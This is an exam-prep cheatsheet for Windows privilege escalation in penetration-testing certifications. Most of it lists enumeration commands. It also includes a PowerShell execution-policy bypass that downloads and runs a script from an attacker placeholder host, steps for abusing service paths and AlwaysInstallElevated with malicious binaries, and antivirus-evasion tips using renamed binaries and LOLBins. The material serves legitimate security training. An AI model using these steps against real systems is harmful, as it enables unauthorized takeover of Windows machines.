# Windows Privilege Escalation – Workflow & Cheatsheet (eJPT / PT1)

This cheatsheet documents a **systematic Windows privilege escalation methodology** after gaining an initial foothold (SMB, RDP, reverse shell).
Optimized for **eJPT / PT1** speed, reliability, and reporting.

---

## 1. Workflow & Methodology (CMD / PowerShell)

### Step 1: Stabilize Access
- Prefer **RDP** as a low-privileged user when available
- If using Metasploit, migrate Meterpreter → `shell`

---

### Step 2: Baseline Recon
```cmd
whoami /all
whoami /priv
systeminfo
sc query WinDefend
```

**Objectives:**
- Identify privileges (`SeImpersonate`, `SeDebug`)
- Determine OS version & patch level
- Check Defender / AV status

---

### Step 3: Automated Enumeration

#### PowerUp.ps1
```powershell
powershell -nop -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<YOUR_IP>/PowerUp.ps1'); Invoke-AllChecks"
```

Save output:
```powershell
Invoke-AllChecks *>&1 | Out-File C:\Users\Public\powerup.txt
```

#### WinPEAS
```cmd
WinPEASx64.exe nouserinfo nopass nofirewall nomemory -t 10
```

> Recommended directory: `C:\Users\Public\`

---

### Step 4: Manual Enumeration Categories

#### Services
```cmd
sc query
wmic service get name,pathname,startmode
sc qc <SERVICE_NAME>
```
Look for: Unquoted service paths, writable binaries, services running as SYSTEM

#### Scheduled Tasks
```cmd
schtasks /query /fo LIST /v
```
Targets: Weak permissions, PATH abuse, executables in writable directories

#### Registry Autoruns
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
Use cases: DLL hijacking, startup binary replacement

#### File & Service Permissions
```cmd
icacls C:\
accesschk.exe -uwcqv "Everyone" *
```
High-value targets: Service executables, program directories, config files

#### Processes
```cmd
tasklist /svc
net start
```
Purpose: Identify running services, restart services after exploitation

#### Hotfixes
```cmd
wmic qfe list brief /format:table
```
> Use only to confirm kernel exploit feasibility (rare in eJPT).

---

## 2. Command Cheatsheet

| Category | Command | Purpose | Exam Relevance |
|----------|---------|---------|----------------|
| User Context | `whoami /all` | Groups & SIDs | Core |
| Privileges | `whoami /priv` | Token abuse | High |
| OS Info | `systeminfo` | Vuln matching | Medium |
| Services | `wmic service get name,pathname` | Unquoted paths | High |
| Tasks | `schtasks /query /v` | Task abuse | High |
| Registry | `reg query ...\\Run` | DLL hijacking | Medium |
| Permissions | `icacls`, `accesschk` | Weak DACLs | High |
| Processes | `tasklist /svc` | Service hijack | Medium |
| Hotfixes | `wmic qfe` | Kernel exploits | Low |

---

## 3. Common Privilege Escalation Techniques

### Unquoted Service Paths

**Example:**
```
C:\Program Files\Vulnerable Service\service.exe
```

**Exploit:** Drop malicious executables in:
- `C:\Program.exe`
- `C:\Program Files\Vulnerable.exe`

Restart service → SYSTEM shell

---

### Weak Service Permissions
```cmd
sc qc <svc>
icacls <binary>
```
Replace binary → restart service

---

### AlwaysInstallElevated

**Check:**
```cmd
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```

**Exploit:**
```cmd
msiexec /quiet /qn /i malicious.msi
```

---

### Registry / DLL Hijacking
- Writable autorun keys
- Missing DLLs loaded from writable paths
- Trigger via reboot or service restart

---

### Token Impersonation

**Required privileges:**
- `SeImpersonatePrivilege`
- `SeAssignPrimaryToken`

**Tools:**
- PrintSpoofer
- JuicyPotato (context-dependent)

---

## 4. Tool Highlights

### PowerUp.ps1
- Best logic-based detection
- Flags misconfigurations clearly
- Slow but thorough

### WinPEAS
- Fast enumeration
- Color-coded output
- Less logic, more surface coverage

> ⚠️ Tools suggest, you verify.

---

## 5. eJPT / PT1 Exam Mapping

- Expect **1–2 Windows privilege escalations**
- Common paths:
  - SMB → service abuse → SYSTEM
  - RDP → PowerUp → unquoted path
  - Kernel exploits are rare

**Time strategy:**
- 5 min enumeration
- 10 min exploitation

**Proof:**
- SYSTEM shell
- Admin Desktop access (screenshot)

---

## 6. Common Pitfalls

| Issue | Fix |
|-------|-----|
| PowerShell blocked | `powershell -nop -exec bypass` |
| Wrong architecture | `wmic os get osarchitecture` |
| Forgot service restart | `sc stop <svc> && sc start <svc>` |
| Permission denied | `takeown /F <file>` then `icacls <file> /grant %username%:F` |
| AV issues | Rename binaries or use LOLBins (`certutil`, `mshta`) |
